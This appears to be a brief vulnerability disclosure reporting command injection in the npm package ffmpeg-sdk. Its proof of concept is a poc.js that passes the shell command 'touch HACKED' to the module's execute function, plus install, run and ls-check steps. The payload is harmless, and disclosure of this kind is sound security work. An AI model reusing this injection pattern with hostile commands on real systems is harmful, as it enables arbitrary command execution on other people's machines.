# Description

Command Injection in ffmpeg-sdk

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var root = require("ffmpeg-sdk");
root.execute("touch HACKED");
```

2. Execute the following commands in terminal:

```
npm i ffmpeg-sdk # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
